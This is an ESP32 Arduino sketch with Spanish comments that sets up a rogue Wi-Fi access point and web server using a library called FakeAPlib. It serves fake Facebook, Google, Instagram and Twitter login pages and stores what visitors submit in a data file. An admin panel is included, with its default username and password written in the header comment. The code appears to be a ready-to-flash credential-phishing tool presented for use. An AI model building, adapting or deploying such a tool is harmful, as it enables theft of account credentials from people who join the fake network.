/**
 * @file web_server.ino
 * @authors NGUEYOU SIMO, Neil L.; MORENO ROMO, Lucas; RUBIO JIMÉNEZ, Mario
 * @brief Los pines y funciones para leer y escribir en una SD ya están definidos en los archivos fuente SDFiles.
 * 		    Tenga en cuenta que esto solo está destinado a ser utilizado en una placa ESP32 que tiene un lector SD
 * 		    integrado.
 * 		    Las dependencias de esta libreria son:
 * 			  - FS.h
 * 			  - SD_MMC.h
 *        El usuario por defecto de administrador es:
 *          admin
 *          @dmIn129
 *
 * @version 0.1
 * @date 2025-01-26
 *
 */


#include <FakeAPlib.h>

const char* SSID      = "ESP.local-server"; // nombre del punto de acceso del servidor
const char* PASS      = "SECUREhash9361";   // contraseña del punto de acceso del servidor
//const char* WIFI_SSID = "Your-wifi";        // [opcional] nombre de la wifi a la que se va a conectar 
//const char* WIFI_PSW  = "Your-password";    // [opcional] contraseña de la wifi a la que se va a conectar 

const char* DATA_FILE  = "/data/data.json";                        // [opcional] ruta del archvivo donde se almacenan los datos
const char* INDEX_PAGE = "/webpages/admin-login/index-login.html"; // ruta de la pagina de inicio del servidor
const char* ADMIN_PAGE = "/webpages/admin-login/admin-panel.html"; // ruta de la pagina del panel de admin

// rutas de las carpetas en las que están las paginas de redes sociales
const char* FB_PATH = "/webpages/facebook-login";
const char* GL_PATH = "/webpages/google-login";
const char* IS_PATH = "/webpages/instagram-login";
const char* TW_PATH = "/webpages/twitter-login";

const IPAddress* serverip = new IPAddress(10,10,1,1); // dirección IP servidor

FakeAP* accessPoint = new FakeAP(80); // iniciar un servidor el puerto 80
										                  // en caso de no indicar ninguno, el puerto por defecto es 80
int printed = 0;

void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Cargando....");
  delay(1000);

  //metodo para definir las rutas de las paginas
	//el primer argumento es la ruta y el segundo es el tipo de archivo
  accessPoint->setPath(ADMIN_PAGE, ADMINPAGE);
  accessPoint->setPath(INDEX_PAGE, INDEXPAGE);
  accessPoint->setPath(DATA_FILE,  DATAFILE);
  
  accessPoint->setPath(FB_PATH, FACEBOOK);
  accessPoint->setPath(GL_PATH, GOOGLE);
  accessPoint->setPath(IS_PATH, INSTAGRAM);
  accessPoint->setPath(TW_PATH, TWITTER);

  //[opcional] configuración del modo de la wifi y del nombre de host
  WiFi.mode(WIFI_AP);
  WiFi.hostname("ESP.server");

  //iniciar el punto de acceso y el servidor, y conectarse a la wifi inidicada
  WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 255, 0));
  if (!accessPoint->initialize(SSID, PASS, WIFI_SSID, WIFI_PSW))
    Serial.println("Error en la configuración del servidor");
  //este modo solo inicia el punto de acceso y el servidor si no  se inidica ninguna wifi
	//las contraseñas de las redes wifi son opcionales
    
  Serial.println("Configuración acabada!");
}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    Serial.println("En espera de solicitudes...");
    printed++;
  }
}